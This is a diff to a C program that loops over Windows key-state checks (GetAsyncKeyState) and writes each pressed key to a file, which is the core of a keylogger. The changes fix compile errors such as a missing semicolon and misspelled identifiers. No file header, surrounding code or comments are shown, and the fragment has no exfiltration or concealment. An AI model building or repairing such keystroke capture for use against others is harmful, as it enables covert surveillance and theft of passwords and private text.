@@ -13,7 +13,7 @@ int main(){
 
  char mayusArr[] = {
     'A','B','C','D','E','F','G','H','I','J','K','L','M',
-    'N','Ñ','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
+    'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' 
  };
 char minusArr[] = {
     'a','b','c','d','e','f','g','h','i','j','k','l','m',
@@ -48,8 +48,8 @@ while(1){
   }
  }
  for(int z = 0; z<numsArrLen;z++)//Numpad Keys
- if(GetAsyncKeyState(VK_NUMPAD+z) & 0x8000){
-  fprintf(f,"%c",numsArr[z])
+ if(GetAsyncKeyState(VK_NUMPAD0 + z) & 0x8000){
+  fprintf(f,"%c",numsArr[z]);
   fflush(f);
   }
  }
@@ -66,22 +66,16 @@ while(1){
  }else if(GetAsyncKeyState(VK_ADD) & 0x8000){
    fprintf(f, "+");
    fflush(f);
- }else if(GetAsyncKeyState(VK_SUBSTRACT) & 0x8000){
+ }else if(GetAsyncKeyState(VK_SUBTRACT) & 0x8000){
    fprintf(f, "-");
    fflush(f);
  }else if(GetAsyncKeyState(VK_DECIMAL) & 0X8000){
    fprintf(f, ".");
    fflush(f);
  }else if(GetAsyncKeyState(VK_DIVIDE) &0x8000){
-    fprinf(f, "/");
+    fprintf(f, "/");
     fflush(f);
  }
-
- 
-
-
-
-
 
 }//END WHILE
 return 0;
